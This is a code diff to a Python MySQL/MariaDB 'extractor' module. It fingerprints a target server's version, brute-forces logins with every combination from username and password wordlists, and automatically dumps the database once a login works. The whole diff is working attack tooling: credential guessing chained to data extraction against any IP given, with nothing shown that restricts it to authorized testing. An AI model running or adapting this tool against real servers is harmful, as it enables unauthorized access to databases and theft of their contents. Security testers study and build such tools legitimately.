@@ -1,28 +1,20 @@
-"""MySQL extractor — fingerprints MySQL version and tests default credentials."""
+"""MySQL extractor — fingerprints MySQL/MariaDB version and tests credentials from wordlists."""
 
+import hashlib
+import itertools
+import os
 import socket
 import struct
-import hashlib
 
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# Common default/weak credentials to test
-DEFAULT_CREDENTIALS = [
-    ('root', ''),
-    ('root', 'root'),
-    ('root', 'password'),
-    ('root', 'mysql'),
-    ('root', 'admin'),
-    ('admin', 'admin'),
-    ('admin', ''),
-    ('mysql', 'mysql'),
-    ('mysql', ''),
-    ('test', 'test'),
-    ('test', ''),
-]
+# Fallback credentials if wordlists are not found
+FALLBACK_USERNAMES = ['root', 'admin', 'mysql', 'test', 'cpanel']
+FALLBACK_PASSWORDS = ['', 'root', 'admin', 'password', 'mysql', '123456']
 
 
 class MySQLExtractor:
-    """Fingerprints MySQL version and attempts login with default credentials."""
+    """Fingerprints MySQL/MariaDB version and attempts login with credentials from wordlists."""
 
     def __init__(self, ip: str, port: int = 3306):
         """Initialize with target IP and port.
@@ -35,7 +27,7 @@ class MySQLExtractor:
         self.port = port
 
     def run(self):
-        """Attempt TCP connection, read banner, then test default credentials.
+        """Attempt TCP connection, read banner, then test credentials from wordlists.
 
         Returns:
             dict: Version, credential test results, and any successful logins.
@@ -59,14 +51,18 @@ class MySQLExtractor:
             result['status'] = 'failed'
             return result
 
-        # Test default credentials
-        print(f"  [MySQL] Testing {len(DEFAULT_CREDENTIALS)} default credentials...")
-        for username, password in DEFAULT_CREDENTIALS:
+        credentials = self._load_credentials()
+        print(f"  [MySQL] Testing {len(credentials)} combinations...")
+
+        for username, password in credentials:
             cred_result = self._test_credential(username, password, salt)
             display = f"{username}:{password if password else '(empty)'}"
             if cred_result == 'success':
                 print(f"  [MySQL] *** VALID CREDENTIAL FOUND: {display} ***")
                 result['credentials'].append({'user': username, 'password': password, 'status': 'valid'})
+                from src.utils.extractors.mysql_dump import MySQLDumper
+                dumper = MySQLDumper(self.ip, self.port, username, password)
+                dumper.run()
             elif cred_result == 'wrong_password':
                 print(f"  [MySQL] Invalid: {display}")
             else:
@@ -74,27 +70,71 @@ class MySQLExtractor:
 
         return result
 
-    def _parse_banner(self, banner: bytes):
-        """Extract version string and auth salt from MySQL handshake packet.
+    def _load_credentials(self) -> list:
+        """Load usernames and passwords from wordlist files and return all combinations.
+
+        Looks for any .txt file in the wordlists/ directory.
+        Expects at least one file with 'user' in the name and one with 'pass' in the name.
+        Falls back to built-in defaults if files are not found.
+
+        Returns:
+            list: List of (username, password) tuples.
+        """
+        wordlists_path = os.path.join(BASE_DIR, '..', '..', '..', 'wordlists')
+        usernames = self._load_wordlist(wordlists_path, 'user', FALLBACK_USERNAMES)
+        passwords = self._load_wordlist(wordlists_path, 'pass', FALLBACK_PASSWORDS)
+        return list(itertools.product(usernames, passwords))
+
+    def _load_wordlist(self, directory: str, keyword: str, fallback: list) -> list:
+        """Find and load a wordlist file whose name contains the given keyword.
 
         Args:
-            banner (bytes): Raw bytes from MySQL server greeting.
+            directory (str): Path to wordlists directory.
+            keyword (str): Keyword to match in filename (e.g. 'user', 'pass').
+            fallback (list): Default list to use if no matching file is found.
+
+        Returns:
+            list: Lines from the matched file, or fallback list.
+        """
+        try:
+            for filename in os.listdir(directory):
+                if keyword.lower() in filename.lower() and filename.endswith('.txt'):
+                    filepath = os.path.join(directory, filename)
+                    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
+                        lines = [line.strip() for line in f if line.strip()]
+                    print(f"  [MySQL] Loaded {len(lines)} entries from {filename}")
+                    return lines
+        except FileNotFoundError:
+            pass
+        print(f"  [MySQL] No wordlist found for '{keyword}' — using fallback ({len(fallback)} entries)")
+        return fallback
+
+    def _parse_banner(self, banner: bytes):
+        """Extract version string and auth salt from MySQL/MariaDB handshake packet.
+
+        Args:
+            banner (bytes): Raw bytes from server greeting.
 
         Returns:
             tuple: (version_string, salt_bytes)
         """
         try:
             payload = banner[4:]
-            if payload[0] == 10:  # protocol v10
-                version = payload[1:].split(b'\x00')[0].decode('utf-8', errors='ignore')
-                # Salt is split: first 8 bytes after version+null, more after capability flags
-                rest = payload[1 + len(version) + 1:]
-                salt1 = rest[:8]
-                # Skip: salt1(8) + filler(1) + capabilities(2) + charset(1) + status(2) + capabilities2(2) + auth_len(1) + reserved(10)
-                salt2_offset = 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10
-                salt2 = rest[salt2_offset:salt2_offset + 12]
-                salt = salt1 + salt2
-                return version, salt
+            if payload[0] != 10:
+                return 'unknown', b''
+
+            version_end = payload.index(b'\x00', 1)
+            version = payload[1:version_end].decode('utf-8', errors='ignore')
+            display_version = version.replace('5.5.5-', '')
+
+            offset = version_end + 1 + 4
+            salt1 = payload[offset:offset + 8]
+
+            offset2 = offset + 8 + 1 + 2 + 1 + 2 + 2 + 1 + 10
+            salt2 = payload[offset2:offset2 + 12]
+
+            salt = salt1 + salt2
+            return display_version, salt if len(salt) >= 16 else b''
         except Exception:
             pass
         return 'unknown', b''
@@ -116,7 +156,6 @@ class MySQLExtractor:
             sock.connect((self.ip, self.port))
             raw_banner = sock.recv(1024)
 
-            # Re-parse salt fresh from this connection
             _, live_salt = self._parse_banner(raw_banner)
             if not live_salt:
                 sock.close()
